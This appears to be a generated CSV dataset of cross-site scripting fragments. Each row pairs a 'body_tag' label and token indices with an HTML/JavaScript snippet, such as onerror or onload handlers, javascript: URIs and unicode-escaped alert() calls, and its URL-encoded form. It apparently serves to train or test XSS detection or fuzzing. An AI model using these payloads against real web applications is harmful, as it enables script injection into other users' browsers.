body_tag,"[3, 15, 54, 47, 33]",<video><source/<body/onload=alert();data=<canvas/,%3Cvideo%3E%3Csource/%3Cbody/onload%3Dalert%28%29%3Bdata%3D%3Ccanvas/
body_tag,"[68, 74, 31, 27, 72]", /> </select><object/#,%20/%3E%20%3C/select%3E%3Cobject/%23
body_tag,"[45, 66, 41, 43, 10]","data=saivs.html prompt(1);src=""data:text/html,type=""image"" <option/",data%3Dsaivs.html%20prompt%281%29%3Bsrc%3D%22data%3Atext/html%2Ctype%3D%22image%22%20%3Coption/
body_tag,"[3, 22, 45, 51, 14]",<video><source/<frameset><frame/data=saivs.html javascript:alert();<body ,%3Cvideo%3E%3Csource/%3Cframeset%3E%3Cframe/data%3Dsaivs.html%20javascript%3Aalert%28%29%3B%3Cbody%20
body_tag,"[46, 32, 52, 71, 18]","data=""data:text/html,<canvas javascript:\u0061lert();'<iframe ",data%3D%22data%3Atext/html%2C%3Ccanvas%20javascript%3A%5Cu0061lert%28%29%3B%27%3Ciframe%20
body_tag,"[17, 15, 37, 4, 2]",<input/<body/</embed><script <video><source ,%3Cinput/%3Cbody/%3C/embed%3E%3Cscript%20%3Cvideo%3E%3Csource%20
body_tag,"[5, 23, 16, 37, 52]",<script/</frameset><input </embed>javascript:\u0061lert();,%3Cscript/%3C/frameset%3E%3Cinput%20%3C/embed%3Ejavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[23, 36, 57, 63, 14]",</frameset><embed/onerror=alert();\u0061lert``;<body ,%3C/frameset%3E%3Cembed/onerror%3Dalert%28%29%3B%5Cu0061lert%60%60%3B%3Cbody%20
body_tag,"[43, 10, 0, 51, 4]","type=""image"" <option/<script>javascript:alert();<script ",type%3D%22image%22%20%3Coption/%3Cscript%3Ejavascript%3Aalert%28%29%3B%3Cscript%20
body_tag,"[21, 49, 21, 71, 74]",<frameset><frame onerror=\u0061lert();<frameset><frame ' ,%3Cframeset%3E%3Cframe%20onerror%3D%5Cu0061lert%28%29%3B%3Cframeset%3E%3Cframe%20%27%20
body_tag,"[16, 22, 74, 48, 45]",<input <frameset><frame/ onerror=javascript:alert();data=saivs.html ,%3Cinput%20%3Cframeset%3E%3Cframe/%20onerror%3Djavascript%3Aalert%28%29%3Bdata%3Dsaivs.html%20
body_tag,"[74, 49, 6, 11, 26]", onerror=\u0061lert();<a <img <object ,%20onerror%3D%5Cu0061lert%28%29%3B%3Ca%20%3Cimg%20%3Cobject%20
body_tag,"[29, 21, 14, 59, 40]",<select <frameset><frame <body alert();src=  ,%3Cselect%20%3Cframeset%3E%3Cframe%20%3Cbody%20alert%28%29%3Bsrc%3D%20%20
body_tag,"[58, 30, 43, 50, 68]","saivs.js <select/type=""image"" onerror=al\u0065rt(); />",saivs.js%20%3Cselect/type%3D%22image%22%20onerror%3Dal%5Cu0065rt%28%29%3B%20/%3E
body_tag,"[15, 31, 29, 23, 71]",<body/</select><select </frameset>',%3Cbody/%3C/select%3E%3Cselect%20%3C/frameset%3E%27
body_tag,"[56, 22, 34, 35, 27]",onmouseover=alert();<frameset><frame/</canvas><embed <object/,onmouseover%3Dalert%28%29%3B%3Cframeset%3E%3Cframe/%3C/canvas%3E%3Cembed%20%3Cobject/
body_tag,"[58, 43, 69, 13, 32]","saivs.js type=""image"" <</img><canvas ",saivs.js%20type%3D%22image%22%20%3C%3C/img%3E%3Ccanvas%20
